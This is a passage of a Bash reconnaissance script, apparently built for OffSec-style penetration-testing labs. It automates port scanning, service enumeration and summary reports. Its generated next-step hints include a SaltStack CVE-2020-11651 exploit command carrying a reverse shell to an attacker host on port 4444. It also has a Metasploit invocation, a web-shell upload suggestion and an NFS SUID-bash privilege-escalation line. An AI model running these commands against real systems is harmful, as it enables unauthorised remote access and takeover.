            "python3 /tmp/salt_cve/exploit.py --master $ip --exec 'bash -c \"bash -i >& /dev/tcp/\${KALI_IP}/4444 0>&1\"'" \
            "" \
            "# NOTE: engagement — using msf here counts against your one-machine budget. Prefer step 2." \
            "# Step 3 — Metasploit fallback (enumerate minions + execute on them):" \
            "msfconsole -qx \"use exploit/linux/misc/saltstack_salt_api_cmd_exec; set RHOSTS $ip; set LHOST \${KALI_IP}; ${salt_api_port:+set RPORT ${salt_api_port}; }run\"" \
            "" \
            "# DECIDE: exploit returns output → RCE as root confirmed, pivot to minions via salt '*' cmd.run;" \
            "# DECIDE: 'Method not found' or auth_check OK → master is patched (>=3000.2, >=2019.2.4), stop;" \
            "# DECIDE: connection refused on 4506 but 4505 open → firewall between Kali and master, try through proxychains;" \
            "# DECIDE: salt-api port absent → master unreachable via HTTP, only ZMTP direct — PoC still works via raw 4506." \
            "" \
            "searchsploit --cve CVE-2020-11651" \
            "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §4 Exploit Type Reference" \
            "# TODO: vault has no §SaltStack — add one after the engagement with the PoC clone + three exec patterns above"
    fi

    # --- OffSec service-port knowledge base → generic pointers ---
    # One stanza per KB-matching open port. The KB lives at the top of the script
    # (OffSec_SERVICE_HINTS). To add a new service, add ONE line to the KB — no new
    # code here, no new enum module.
    emit_kb_port_hints "$ip" "$target_dir" "$next_file"
    emit_kb_header_hints "$ip" "$target_dir" "$next_file"

    # --- Vulners CVE hits → searchsploit/exploit hunt ---
    if is_nonempty_file "$target_dir/loot/vulners_hits.txt"; then
        append_next_finding "$next_file" \
            "Vulners NSE produced CVE matches" \
            "$target_dir/loot/vulners_hits.txt contains CVE entries (CVSS ≥ 7.0 or *EXPLOIT*)" \
            "# --- Full list ---" \
            "cat $target_dir/loot/vulners_hits.txt" \
            "# --- Top CVEs per service (dedup, sort by CVSS) ---" \
            "awk -F'\\t' '{print \$2, \$3}' $target_dir/loot/vulners_hits.txt | sort -u" \
            "# --- searchsploit sweep of flagged CVEs ---" \
            "grep -oE 'CVE-[0-9]+-[0-9]+' $target_dir/loot/vulners_hits.txt | sort -u | head -50 | while read cve; do echo \"=== \$cve ===\"; searchsploit --cve \"\$cve\"; done" \
            "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §1 Vet Before You Dig"
    fi

    if ! grep -q '^## ' "$next_file" 2>/dev/null; then
        echo "(no grounded next-step commands generated)" >> "$next_file"
    fi
}

#------------------------------------------------------------------------------
# PRUNE RECON ARTIFACTS
# Remove intermediate files that are never referenced once the summary,
# quick_wins, and next_steps have been written. is_phase_done reads
# progress.log (not files), so deletions do not break `--resume`.
#------------------------------------------------------------------------------
prune_recon_artifacts() {
    local target_dir="$1"
    [[ -d "$target_dir" ]] || return 0
    rm -f "$target_dir"/scans/*_console.txt \
          "$target_dir"/scans/*.gnmap \
          "$target_dir"/scans/rustscan_tcp.txt \
          "$target_dir"/tcp/ssh/banner.txt \
          2>/dev/null || true
}

#------------------------------------------------------------------------------
# GENERATE SUMMARY REPORT
#------------------------------------------------------------------------------
generate_summary() {
    local ip="$1"
    local target_dir="$2"
    local summary="$target_dir/summary.txt"

    header "Generating Summary Report -> $ip"
    generate_quick_wins "$ip" "$target_dir"
    generate_next_steps "$ip" "$target_dir"

    {
        echo "+==============================================================+"
        echo "|           OffSec RECON SUMMARY -- $ip"
        echo "|           Generated: $(date)"
        echo "+==============================================================+"
        echo ""

        # --- Open Ports ---
        echo "=== OPEN PORTS ================================================"
        echo ""
        echo "TCP Ports:"
        if [[ -f "$target_dir/scans/tcp_ports.txt" ]]; then
            echo "  $(cat "$target_dir/scans/tcp_ports.txt")"
        else
            echo "  (no TCP scan results)"
        fi
        echo ""
        echo "UDP Ports:"
        if [[ -f "$target_dir/scans/udp_ports.txt" ]]; then
            echo "  $(cat "$target_dir/scans/udp_ports.txt")"
        else
            echo "  (no open UDP ports found)"
        fi
        echo ""

        # --- Service Details (from nmap) ---
        echo "=== SERVICES =================================================="
        echo ""
        if [[ -f "$target_dir/scans/nmap_tcp.nmap" ]]; then
            grep -P '^\d+/(tcp|udp)\s+open\s' "$target_dir/scans/nmap_tcp.nmap" 2>/dev/null | \
                while IFS= read -r line; do echo "  $line"; done
        fi
        echo ""

        # --- OS Detection ---
        echo "=== OS DETECTION ============================================"
        echo ""
        if [[ -f "$target_dir/scans/nmap_tcp.nmap" ]]; then
            grep -A2 'OS details\|Running:' "$target_dir/scans/nmap_tcp.nmap" 2>/dev/null | \
                while IFS= read -r line; do echo "  $line"; done
        fi
        echo ""

        # --- Priority Attack Vectors (decision-first) ---
        echo "=== * PRIORITY ATTACK VECTORS * ==============================="
        echo ""
        local prio_buf=""
        # P1: unauthenticated access / empty creds
        if grep -qE 'mysql.*empty|empty password' "$target_dir/scans/nmap_tcp.nmap" 2>/dev/null; then
            prio_buf+="  [P1] MySQL empty root password -> mysql -h $ip -u root"$'\n'
        fi
        if compgen -G "$target_dir/tcp/ftp/anon_*" > /dev/null 2>&1; then
            prio_buf+="  [P1] Anonymous FTP -> ftp $ip  (upload web shell if webroot writable)"$'\n'
        fi
        if grep -qhE 'Anonymous login successful|null session|NT_STATUS_OK' "$target_dir/tcp/smb"/*.txt 2>/dev/null; then
            prio_buf+="  [P1] SMB null session -> smbclient -N -L //$ip/   rpcclient -U '' -N $ip"$'\n'
        fi
        # P1: top vulners CVE (filter to real CVE-IDs, sort by CVSS desc)
        if [[ -s "$target_dir/loot/vulners_hits.txt" ]]; then
            local top_cve
            top_cve=$(grep -oE 'CVE-[0-9]{4}-[0-9]+ \([0-9.]+\)' "$target_dir/loot/vulners_hits.txt" 2>/dev/null \
                | sort -u \
                | awk -F'[()]' '{print $2" "$0}' \
                | sort -rn \
                | head -1 \
                | awk '{$1=""; sub(/^ /,""); print}')
            [[ -n "$top_cve" ]] && prio_buf+="  [P1] Top CVE hit: ${top_cve} -> searchsploit $(echo "$top_cve" | awk '{print $1}')"$'\n'
        fi
        # P1/P2: KB-known high-risk service ports (SaltStack/Docker/k8s/Redis/etc.)
        local _kbp
        for _kbp in "${!OffSec_SERVICE_HINTS[@]}"; do
            detected_tcp_port "$target_dir" "$_kbp" || continue
            local _kbnote _kbname _kbcve _tag _suffix
            _kbnote="${OffSec_SERVICE_HINTS[$_kbp]}"
            _kbname=$(echo "$_kbnote" | awk -F'|' '{print $1}' | sed 's/ *$//')
            _kbcve=$(echo "$_kbnote" | grep -oE 'CVE-[0-9]{4}-[0-9]+' | head -1)
            # Promote to P1 if the KB note calls out "unauth" or carries a named CVE.
            if echo "$_kbnote" | grep -qiE 'unauth|no auth'; then
                _tag="[P1]"
            elif [[ -n "$_kbcve" ]]; then
                _tag="[P1]"
            else
                _tag="[P2]"
            fi
            if [[ -n "$_kbcve" ]]; then
                _suffix="-> ${_kbcve} (searchsploit --cve ${_kbcve})"
            else
                _suffix="-> searchsploit $(echo "$_kbname" | awk '{print $1}')"
            fi
            prio_buf+="  ${_tag} :${_kbp} ${_kbname} ${_suffix}"$'\n'
        done
        # P2: web tech with exploitable CMS
        for _wf in "$target_dir"/tcp/http/port_*/whatweb.txt; do
            [[ -f "$_wf" ]] || continue
            local _wport _cms
            _wport=$(basename "$(dirname "$_wf")" | sed 's/port_//')
            _cms=$(grep -oiE 'Jenkins|Drupal|WordPress|GitLab|Confluence|ownCloud|Tomcat|Mezzanine|HFS|Rejetto|phpMyAdmin' "$_wf" 2>/dev/null | sort -u | head -1)
            [[ -n "$_cms" ]] && prio_buf+="  [P2] ${_cms} on port ${_wport} -> see webenum next_steps for exploit PoCs"$'\n'
        done
        # P2: SNMP public
        if [[ -s "$target_dir/udp/snmp/valid_community_strings.txt" ]]; then
            prio_buf+="  [P2] SNMP community valid -> snmpwalk process args for embedded creds"$'\n'
        fi
        # P3: old OpenSSH (user enum)
        if grep -qE 'OpenSSH[_ ][567]\.[0-9]([^0-9]|$)' "$target_dir/scans/nmap_tcp.nmap" 2>/dev/null; then
            prio_buf+="  [P3] Old OpenSSH -> username enumeration (CVE-2018-15473, ssh-audit)"$'\n'
        fi
        if [[ -n "$prio_buf" ]]; then
            printf '%s' "$prio_buf"
        else
            echo "  (no high-signal paths auto-detected -- review Quick Wins and Web Findings)"
        fi
        echo ""

        # --- Credentials & Auth ---
        echo "=== * CREDENTIALS & AUTH * ===================================="
        echo ""
        local cred_buf=""
        if compgen -G "$target_dir/tcp/ftp/anon_*" > /dev/null 2>&1; then
            cred_buf+="  * FTP anonymous login allowed"$'\n'
        fi
        if [[ -s "$target_dir/udp/snmp/valid_community_strings.txt" ]]; then
            while IFS= read -r s; do
                [[ -z "$s" ]] && continue
                cred_buf+="  * SNMP community: $s"$'\n'
            done < "$target_dir/udp/snmp/valid_community_strings.txt"
        fi
        if grep -qE 'mysql.*empty|empty password' "$target_dir/scans/nmap_tcp.nmap" 2>/dev/null; then
            cred_buf+="  * MySQL empty root password (nmap mysql-empty-password)"$'\n'
        fi
        if grep -qiE 'postgres.*trust|trust.*authentication' "$target_dir/scans/nmap_tcp.nmap" 2>/dev/null; then
            cred_buf+="  * PostgreSQL trust auth (no password needed)"$'\n'
        fi
        if grep -qhE 'Anonymous login successful|null session' "$target_dir/tcp/smb"/*.txt 2>/dev/null; then
            cred_buf+="  * SMB null session allowed"$'\n'
        fi
        # Usernames enumerated via VRFY
        if [[ -f "$target_dir/tcp/smtp/vrfy_users.txt" ]]; then
            local _vn
            _vn=$(grep -c '^VALID:' "$target_dir/tcp/smtp/vrfy_users.txt" 2>/dev/null); _vn=${_vn:-0}
            (( _vn > 0 )) && cred_buf+="  * SMTP VRFY enumerated ${_vn} usernames (tcp/smtp/vrfy_users.txt)"$'\n'
        fi
        # Credential-flavored lines from quick_wins
        if [[ -s "$target_dir/loot/quick_wins.txt" ]]; then
            local _cq
            _cq=$(grep -iE 'credential|password|default.*cred|anonymous|empty.*pass' "$target_dir/loot/quick_wins.txt" 2>/dev/null | sort -u)
            [[ -n "$_cq" ]] && cred_buf+=$(echo "$_cq" | sed 's/^/  * /')$'\n'
        fi
        if [[ -n "$cred_buf" ]]; then
            printf '%s' "$cred_buf"
        else
            echo "  (no credentials or auth weaknesses captured -- verify manually)"
        fi
        echo ""

        # --- Anonymous / Null-Session Access ---
        echo "=== * ANONYMOUS / NULL-SESSION ACCESS * ======================="
        echo ""
        local anon_buf=""
        if compgen -G "$target_dir/tcp/ftp/anon_*" > /dev/null 2>&1; then
            anon_buf+="  * FTP  -> ftp $ip  (user: anonymous, any password)"$'\n'
        fi
        if grep -qhE 'Anonymous login successful|null session' "$target_dir/tcp/smb"/*.txt 2>/dev/null; then
            anon_buf+="  * SMB  -> smbclient -N -L //$ip/   rpcclient -U '' -N $ip"$'\n'
        fi
        if grep -qhiE 'anonymous.*bind|LDAP.*anonymous' "$target_dir/tcp/ldap"/*.txt 2>/dev/null; then
            anon_buf+="  * LDAP -> ldapsearch -x -H ldap://$ip -s base -b ''  (then enumerate DN)"$'\n'
        fi
        if grep -qP '^\s*/' "$target_dir/tcp/rpc/nfs_exports.txt" 2>/dev/null; then
            local _exp
            _exp=$(grep -P '^\s*/' "$target_dir/tcp/rpc/nfs_exports.txt" 2>/dev/null | awk '{print $1}' | tr '\n' ' ')
            anon_buf+="  * NFS  -> exports: $_exp  (try: mount -t nfs $ip:<export> /mnt)"$'\n'
        fi
        if [[ -n "$anon_buf" ]]; then
            printf '%s' "$anon_buf"
        else
            echo "  (no anonymous access paths detected)"
        fi
        echo ""

        # --- CVE Hits (vulners NSE) ---
        echo "=== * CVE HITS (vulners) * ===================================="
        echo ""
        if [[ -s "$target_dir/loot/vulners_hits.txt" ]]; then
            # Show top 10 real CVEs by CVSS (filter UUID/vulners-internal IDs)
            grep -E 'CVE-[0-9]{4}-[0-9]+' "$target_dir/loot/vulners_hits.txt" 2>/dev/null \
                | awk '{
                    match($0, /CVE-[0-9]{4}-[0-9]+/); cve=substr($0,RSTART,RLENGTH);
                    match($0, /\([0-9.]+\)/); cvss=substr($0,RSTART+1,RLENGTH-2);
                    port=$2;
                    print cvss"|"cve"|"port
                  }' \
                | sort -t'|' -k1,1rn -u \
                | head -10 \
                | awk -F'|' '{printf "  [%s] %s  (%s)\n", $1, $2, $3}'
            echo ""
            echo "  Full list: $target_dir/loot/vulners_hits.txt"
            echo "  searchsploit <CVE-ID> to find public exploits"
        else
            echo "  (no vulners NSE hits -- confirm --script vulners ran in nmap phase)"
        fi
        echo ""

        # --- Tech Stack / CMS Fingerprints ---
        echo "=== * TECH STACK & CMS * ======================================"
        echo ""
        local tech_buf=""
        for _wf in "$target_dir"/tcp/http/port_*/whatweb.txt; do
            [[ -f "$_wf" ]] || continue
            local _wport _techs
            _wport=$(basename "$(dirname "$_wf")" | sed 's/port_//')
            _techs=$(grep -oE '(WordPress|Drupal|Joomla|Jenkins|GitLab|Grafana|Mezzanine|phpMyAdmin|Apache[/ ][0-9.]+|nginx[/ ][0-9.]+|IIS[/ ][0-9.]+|Tomcat[/ ][0-9.]+|Confluence|ownCloud|HFS|Rejetto|Next\.?js|PHP[/ ][0-9.]+|OpenSSL[/ ][0-9.a-z-]+|Python[/ ][0-9.]+|Werkzeug[/ ][0-9.]+|Node\.?js)' "$_wf" 2>/dev/null | sort -u | tr '\n' ' ')
            [[ -n "$_techs" ]] && tech_buf+="  Port ${_wport}: ${_techs}"$'\n'
        done
        if [[ -n "$tech_buf" ]]; then
            printf '%s' "$tech_buf"
        else
            echo "  (no web tech fingerprints detected)"
        fi
        echo ""

        # --- Quick Wins / Loot ---
        echo "=== * QUICK WINS * ========================================="
        echo ""
        if [[ -f "$target_dir/loot/quick_wins.txt" && -s "$target_dir/loot/quick_wins.txt" ]]; then
            while IFS= read -r line; do echo "  * $line"; done < "$target_dir/loot/quick_wins.txt"
        else
            echo "  (no quick wins found -- deeper manual enumeration may be needed)"
        fi
        echo ""

        # --- HTTP Findings ---
        echo "=== WEB FINDINGS ============================================"
        echo ""
        for httpdir in "$target_dir/tcp/http"/port_*; do
            [[ -d "$httpdir" ]] || continue
            local p=""
            p=$(basename "$httpdir" | sed 's/port_//')
            echo "  --- Port $p ---"
            if [[ -f "$httpdir/whatweb.txt" ]]; then
                echo "  WhatWeb: $(head -1 "$httpdir/whatweb.txt" 2>/dev/null | sed 's/\x1b\[[0-9;]*m//g')"
            fi
            if [[ -f "$httpdir/gobuster_dir.txt" ]]; then
                local hits=""
                hits=$(grep -c '^/' "$httpdir/gobuster_dir.txt" 2>/dev/null); hits=${hits:-0}
                echo "  Gobuster: $hits directories/files found"
                # Show top interesting hits
                grep -iE '/admin|/login|/upload|/config|/backup|/shell|/api|/console|/phpmyadmin|/wp-|/cgi' \
                    "$httpdir/gobuster_dir.txt" 2>/dev/null | head -10 | \
                    while IFS= read -r line; do echo "    -> $line"; done
            fi
            if [[ -f "$httpdir/feroxbuster.txt" ]]; then
                local fhits=""
                fhits=$(grep -cE '^\s*(200|301|302|401|403)\s+(GET|HEAD)\s' "$httpdir/feroxbuster.txt" 2>/dev/null); fhits=${fhits:-0}
                echo "  Feroxbuster: $fhits paths found"
                grep -iE '/admin|/login|/upload|/config|/backup|/shell|/api|/console|/phpmyadmin|/wp-|/cgi|/manager|/\.git|/\.env' \
                    "$httpdir/feroxbuster.txt" 2>/dev/null | head -10 | \
                    while IFS= read -r line; do echo "    -> $line"; done
            fi
            if [[ -f "$httpdir/robots.txt" ]] && ! grep -q '# No robots' "$httpdir/robots.txt" 2>/dev/null; then
                echo "  robots.txt: Found (check $httpdir/robots.txt)"
            fi
            echo ""
        done

        # --- SMB Findings ---
        if [[ -d "$target_dir/tcp/smb" ]]; then
            echo "=== SMB FINDINGS ========================================="
            echo ""
            if [[ -f "$target_dir/tcp/smb/smb_quick_findings.txt" ]]; then
                while IFS= read -r line; do echo "  $line"; done < "$target_dir/tcp/smb/smb_quick_findings.txt"
            fi
            # NFS next steps
            if grep -qP '^\s*/' "$target_dir/tcp/rpc/nfs_exports.txt" 2>/dev/null; then
                echo "  NFS NEXT STEPS:"
                while IFS= read -r export_line; do
                    local export_path
                    export_path=$(echo "${export_line}" | awk '{print $1}')
                    [[ -z "${export_path}" ]] && continue
                    echo "    showmount -e $ip"
                    echo "    mkdir /mnt/nfs_${ip//\./_} && mount -t nfs $ip:${export_path} /mnt/nfs_${ip//\./_}"
                    echo "    # If no_root_squash: cp /bin/bash /mnt/nfs_${ip//\./_}/bash && chmod +s /mnt/nfs_${ip//\./_}/bash"
                done < <(grep -P '^\s*/' "$target_dir/tcp/rpc/nfs_exports.txt" 2>/dev/null | head -3)
            fi
            echo ""
        fi

        # --- SNMP Findings ---
        if [[ -d "$target_dir/udp/snmp" ]]; then
            echo "=== SNMP FINDINGS ========================================"
            echo ""
            if [[ -f "$target_dir/udp/snmp/valid_community_strings.txt" ]]; then
                local snmp_strings
                snmp_strings=$(tr '\n' ',' < "$target_dir/udp/snmp/valid_community_strings.txt" | sed 's/,$//')
                echo "  Community strings: ${snmp_strings}"
                echo ""
                echo "  NEXT STEPS:"
                while IFS= read -r community; do
                    [[ -z "${community}" ]] && continue
                    echo "    snmpwalk -v2c -c '${community}' $ip                      # full walk"
                    echo "    snmpwalk -v2c -c '${community}' $ip 1.3.6.1.2.1.25.4.2.1.5  # process args (creds!)"
                done < "$target_dir/udp/snmp/valid_community_strings.txt"
            fi
            if [[ -f "$target_dir/udp/snmp/running_processes.txt" && -s "$target_dir/udp/snmp/running_processes.txt" ]]; then
                echo "  Running processes: $(wc -l < "$target_dir/udp/snmp/running_processes.txt") entries -- check $target_dir/udp/snmp/process_args.txt for embedded creds"
            fi
            if [[ -f "$target_dir/udp/snmp/process_args.txt" && -s "$target_dir/udp/snmp/process_args.txt" ]]; then
                echo "  * process_args.txt present -- grep for credentials:"
                echo "    grep -iE 'pass|pwd|secret|key|token|cred|-p[[:space:]]' $target_dir/udp/snmp/process_args.txt"
            fi
            echo ""
        fi

        # --- SMTP Findings ---
        if grep -q "| DONE | smtp_" "$target_dir/progress.log" 2>/dev/null; then
            echo "=== SMTP FINDINGS ========================================"
            echo ""
            local vrfy_file="$target_dir/tcp/smtp/vrfy_users.txt"
            if [[ -f "$vrfy_file" ]]; then
                local vcount
                vcount=$(grep -c "^VALID:" "$vrfy_file" 2>/dev/null); vcount=${vcount:-0}
                if (( vcount > 0 )); then
                    echo "  * VRFY found $vcount valid users (see $vrfy_file)"
                    echo "  Top users:"
                    grep "^VALID:" "$vrfy_file" 2>/dev/null | head -10 | while IFS= read -r l; do echo "    $l"; done
                else
                    echo "  VRFY enumeration returned no valid users"
                fi
            fi
            # Banner info
            local smtp_banner="$target_dir/tcp/smtp/banner.txt"
            [[ -f "$smtp_banner" ]] && echo "  Banner: $(head -1 "$smtp_banner" 2>/dev/null | tr -d '\r')"
            echo ""
        fi

        # --- POP3 / IMAP Findings ---
        local mail_section=false
        for proto_name in pop3 imap; do
            if grep -q "| DONE | ${proto_name}_" "$target_dir/progress.log" 2>/dev/null; then
                if [[ "$mail_section" == "false" ]]; then
                    echo "=== MAIL SERVICE FINDINGS ================================"
                    echo ""
                    mail_section=true
                fi
                echo "  ${proto_name^^} detected -- check $target_dir/tcp/${proto_name}/ for capabilities/banner"
                find "$target_dir/tcp/${proto_name}" -name "banner_*.txt" 2>/dev/null | while read -r bf; do
                    local port_n
                    port_n=$(basename "$bf" | grep -oP '\d+')
                    local banner_line
                    banner_line=$(head -1 "$bf" 2>/dev/null | tr -d '\r\n')
                    [[ -n "$banner_line" ]] && echo "    Port $port_n: $banner_line"
                done
            fi
        done
        [[ "$mail_section" == "true" ]] && echo ""

        # --- Finding-driven Next-Step Commands ---
        echo "=== * NEXT-STEP COMMANDS * =============================="
        echo ""
        echo "  Full library: $target_dir/loot/next_steps.txt"
        echo ""
        if is_nonempty_file "$target_dir/loot/next_steps.txt"; then
            awk '
                /^## / {shown++; if (shown > 3) exit}
                shown > 0 && !/^# Finding-Driven/ && !/^# Generated/ && !/^# Commands below/ {print "  " $0}
            ' "$target_dir/loot/next_steps.txt"
        else
            echo "  (no grounded next-step commands generated)"
        fi

        echo ""

        # --- Completion Status ---
        echo "=== SCAN STATUS ==========================================="
        echo ""
        if [[ -f "$target_dir/progress.log" ]]; then
            echo "  Completed phases:"
            grep '| DONE |' "$target_dir/progress.log" | awk -F'|' '{print "    [OK] " $3}' | sort -u
            echo ""
            local failed=""
            failed=$(grep '| FAIL |' "$target_dir/progress.log" 2>/dev/null)
            if [[ -n "$failed" ]]; then
                echo "  Failed phases (may need manual re-run):"
                echo "$failed" | awk -F'|' '{print "    [FAIL] " $3 " -- " $4}'
            fi
        fi
        echo ""

        # --- Prune intermediate artifacts before listing ---
        prune_recon_artifacts "$target_dir" >/dev/null 2>&1

        # --- Output Directory ---
        echo "=== OUTPUT FILES ============================================"
        echo ""
        echo "  Full results: $target_dir/"
        find "$target_dir" -type f \( -name "*.txt" -o -name "*.nmap" -o -name "*.xml" -o -name "*.json" \) 2>/dev/null | \
            sort | while IFS= read -r f; do
                local size=""
                size=$(du -h "$f" 2>/dev/null | awk '{print $1}')
                echo "    [$size] ${f#"$target_dir"/}"
            done

    } > "$summary"

    # Also print to terminal
    cat "$summary"
    echo ""
    success "Summary saved to: $summary"
}

#------------------------------------------------------------------------------
# MAIN TARGET HANDLER — orchestrates everything for one IP
#------------------------------------------------------------------------------
recon_target() {
    local ip="$1"

    header "OffSec RECON → $ip"
    echo "  Started: $(date)"
    echo "  Output:  ${RECON_DIR}/${ip}/"

    # --- Setup directory structure (service dirs created on-demand by each enum function) ---
    local target_dir="${RECON_DIR}/${ip}"
    mkdir -p "$target_dir"/{scans,loot}

    # Initialize progress log
    if [[ ! -f "$target_dir/progress.log" ]]; then
        echo "# OffSec Recon Progress Log for $ip" > "$target_dir/progress.log"
        echo "# Started: $(date)" >> "$target_dir/progress.log"
    fi
    progress_log "$target_dir" "START" "recon" "target=$ip"

    # --- Phase 1: Fast TCP port discovery ---
    run_rustscan "$ip" "$target_dir"

    # --- Phase 2: Nmap TCP service detection ---
    run_nmap_tcp "$ip" "$target_dir"

    # --- Phase 3: UDP scan (launch in background — it's slow) ---
    # Use register_cleanup_pid (not register_pid) so wait_for_slot never sees
    # this PID and never decrements RUNNING_JOBS when the UDP scan finishes.
    run_nmap_udp "$ip" "$target_dir" &
    local udp_pid=$!
    register_cleanup_pid "$udp_pid"  # Ctrl+C cleanup without affecting semaphore
    info "UDP scan running in background (PID: $udp_pid)"

    # --- Phase 4: Service-specific enumeration ---
    triage_and_enumerate "$ip" "$target_dir"

    # --- Wait for everything to finish ---
    wait_all_enum
    # Wait for UDP independently so summary reliably includes UDP output
    wait "$udp_pid" 2>/dev/null || true
    unregister_cleanup_pid "$udp_pid"

    # --- Phase 4b: Post-UDP SNMP check ---
    # UDP scan was backgrounded during triage, so SNMP on UDP 161 may have been
    # missed (nmap_udp.nmap didn't exist yet). Re-check now that UDP is done.
    local udp_file="$target_dir/scans/nmap_udp.nmap"
    if [[ -f "$udp_file" ]]; then
        if grep -qP '161/udp\s+open' "$udp_file" 2>/dev/null; then
            if [[ -z "${QUEUED_PHASES[snmp]+x}" ]] && ! is_phase_done "$target_dir" "snmp"; then
                success "SNMP found on UDP 161 (post-UDP check) — launching enumeration"
                enum_snmp "$ip" "161" "$target_dir" "true"
            fi
        fi
    fi

    # --- Phase 5: Generate summary ---
    generate_summary "$ip" "$target_dir"

    progress_log "$target_dir" "DONE" "recon" "target=$ip"
    success "All enumeration complete for $ip"
}

#------------------------------------------------------------------------------
# USAGE / HELP
#------------------------------------------------------------------------------
usage() {
    cat <<'EOF'
OffSec RECON WRAPPER — Automated Enumeration Orchestrator

USAGE:
  ./recon.sh [OPTIONS] <IP> [IP2] [IP3] ...
  ./recon.sh -f <file_with_ips>

OPTIONS:
  -f, --file FILE       Read targets from file (one IP per line)
  --auto                Skip confirmation prompts (auto-run everything)
  --udp-ports N         Number of top UDP ports to scan (default: 200)
  --udp-full            Also scan ALL 65535 UDP ports (slow — use when stuck)
  --batch-size N        Rustscan batch size (default: 4500)
  --rate N              Deprecated alias for --batch-size
  --outdir DIR          Output directory (default: $TOOLKIT_ROOT/recon)
  --max-parallel N      Max parallel service enumerations per target (default: 5)
  --max-parallel-targets N  Max simultaneous target scans (default: 3)
  --sequential          Process targets one at a time (default: parallel)
  --quick-wins          Run 5-min triage per target BEFORE deep recon
  --quick-wins-only     Run triage only, print priority list, then stop
  --no-color            Disable colored output
  --no-sudo             Skip automatic sudo re-exec (run without root privileges)
  -h, --help            Show this help message

EXAMPLES:
  ./recon.sh 10.10.10.1                    # Single target
  ./recon.sh 10.10.10.1 10.10.10.2         # Multiple targets (parallel)
  ./recon.sh --sequential 10.10.10.1 10.10.10.2  # One at a time
  ./recon.sh --quick-wins-only 10.10.10.1 10.10.10.2 10.10.10.3  # Triage first
  ./recon.sh -f targets.txt                 # From file
  ./recon.sh --auto 10.10.10.1              # No prompts
  ./recon.sh --batch-size 3000 --auto 10.10.10.1  # Larger rustscan batches
  ./recon.sh --udp-full --auto 10.10.10.1   # Deep UDP scan

NOTES:
  - Run as root for UDP scanning; non-root mode skips UDP scans safely
  - Re-run safely: completed phases are skipped (delete progress.log to redo)
  - Ctrl+C cleanly kills all background jobs
  - Results in ~/toolkit/recon/<IP>/summary.txt
  - Set TOOLKIT_ROOT env var to change output base (default: ~/toolkit)
EOF
}

#------------------------------------------------------------------------------
# ARGUMENT PARSING
#------------------------------------------------------------------------------
if [[ "${OffSec_LIB_ONLY:-false}" == "true" ]]; then
    # shellcheck disable=SC2317
    return 0 2>/dev/null || exit 0
fi

declare -a TARGETS=()
TARGET_FILE=""
# Preserve original args so sudo re-exec can pass them verbatim
ORIGINAL_ARGS=("$@")

while [[ $# -gt 0 ]]; do
    case "$1" in
        -h|--help|help)
            usage
            exit 0
            ;;
        -f|--file)
            [[ $# -lt 2 ]] && { error "Option $1 requires an argument"; exit 1; }
            TARGET_FILE="$2"
            shift 2
            ;;
        --auto)
            AUTO_MODE=true
            shift
            ;;
        --udp-ports)
            [[ $# -lt 2 ]] && { error "Option $1 requires an argument"; exit 1; }
            UDP_TOP_PORTS="$2"
            shift 2
            ;;
        --udp-full)
            UDP_FULL=true
            shift
            ;;
        --batch-size|--rate)
            [[ $# -lt 2 ]] && { error "Option $1 requires an argument"; exit 1; }
            RUSTSCAN_BATCH_SIZE="$2"
            shift 2
            ;;
        --outdir)
            [[ $# -lt 2 ]] && { error "Option $1 requires an argument"; exit 1; }
            RECON_DIR="$2"
            shift 2
            ;;
        --max-parallel)
            [[ $# -lt 2 ]] && { error "Option $1 requires an argument"; exit 1; }
            MAX_PARALLEL_SERVICES="$2"
            shift 2
            ;;
        --max-parallel-targets)
            [[ $# -lt 2 ]] && { error "Option $1 requires an argument"; exit 1; }
            MAX_PARALLEL_TARGETS="$2"
            shift 2
            ;;
        --quick-wins)
            QUICK_WINS_MODE=true
            shift
            ;;
        --quick-wins-only)
            QUICK_WINS_MODE=true
            QUICK_WINS_ONLY=true
            shift
            ;;
        --sequential)
            SEQUENTIAL_TARGETS=true
            shift
            ;;
        --no-color)
            disable_colors
            shift
            ;;
        --no-sudo)
            NO_SUDO=true
            shift
            ;;
        -*)
            error "Unknown option: $1"
            usage
            exit 1
            ;;
        *)
            TARGETS+=("$1")
            shift
            ;;
    esac
done

if ! is_positive_integer "$UDP_TOP_PORTS" || (( UDP_TOP_PORTS > 65535 )); then
    error "--udp-ports must be an integer between 1 and 65535"
    exit 1
fi

if ! is_positive_integer "$RUSTSCAN_BATCH_SIZE" || (( RUSTSCAN_BATCH_SIZE > 65535 )); then
    error "--batch-size/--rate must be an integer between 1 and 65535"
    exit 1
fi

if ! is_positive_integer "$MAX_PARALLEL_SERVICES" || (( MAX_PARALLEL_SERVICES > 32 )); then
    error "--max-parallel must be an integer between 1 and 32"
    exit 1
fi

# Load targets from file if specified
if [[ -n "$TARGET_FILE" ]]; then
    if [[ ! -f "$TARGET_FILE" ]]; then
        error "Target file not found: $TARGET_FILE"
        exit 1
    fi
    while IFS= read -r line; do
        # Skip empty lines and comments
        read -r line <<< "$line"  # trim leading/trailing whitespace
        [[ -z "$line" || "$line" == \#* ]] && continue
        TARGETS+=("$line")
    done < "$TARGET_FILE"
fi

# Validate we have targets
if (( ${#TARGETS[@]} == 0 )); then
    error "No targets specified"
    usage
    exit 1
fi

# Validate all targets
for target in "${TARGETS[@]}"; do
    if ! is_valid_ip "$target"; then
        error "Invalid target: $target"
        exit 1
    fi
done

#------------------------------------------------------------------------------
# SUDO AUTO-REEXEC
# UDP scanning and OS detection (-sU, -O) require root. Re-execute with sudo
# automatically so the operator doesn't discover the limitation mid-scan.
# Pass --no-sudo to skip this (e.g. when already inside a sudo environment
# that doesn't need escalation, or when testing without privilege).
#------------------------------------------------------------------------------
if [[ $EUID -ne 0 ]] && [[ "$NO_SUDO" != "true" ]]; then
    warn "Not running as root — re-executing with sudo for full scan capability (UDP, OS detect)..."
    warn "Pass --no-sudo to skip this. Sudo may prompt for your password."
    # Build an augmented PATH that includes user-specific bin dirs.
    # sudo's secure_path can strip PATH even when passed via 'env', so we
    # prepend known locations (cargo, local, snap) explicitly so rustscan
    # and other user-installed tools survive the re-exec.
    _inv_user="${SUDO_USER:-$(id -un)}"
    _inv_home=$(getent passwd "$_inv_user" 2>/dev/null | cut -d: -f6)
    _aug_path="${_inv_home}/.cargo/bin:${_inv_home}/.local/bin:${_inv_home}/go/bin:${_inv_home}/snap/bin:${PATH}"
    unset _inv_user _inv_home
    exec sudo env PATH="$_aug_path" TOOLKIT_ROOT="$TOOLKIT_ROOT" "$0" "${ORIGINAL_ARGS[@]}"
    unset _aug_path
